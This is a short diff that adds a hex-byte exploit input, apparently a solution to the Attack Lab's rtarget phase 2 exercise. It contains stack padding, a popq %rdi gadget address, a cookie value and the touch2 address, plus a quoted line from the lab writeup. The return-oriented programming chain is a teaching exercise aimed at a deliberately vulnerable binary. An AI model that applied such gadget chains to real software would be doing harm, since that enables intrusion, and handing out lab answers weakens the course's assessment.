@@ -1,0 +1,12 @@
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+19 2b 40 00 00 00 00 00 /* jump to gadget: popq %rdi */
+fa 97 b9 59 00 00 00 00 /* cookie */
+ec 17 40 00 00 00 00 00 /* jump to touch 2 */
+
+From writeup:
+Important: The gadget farm is demarcated by functions start_farm and end_farm in your copy of
+rtarget. Do not attempt to construct gadgets from other portions of the program code.
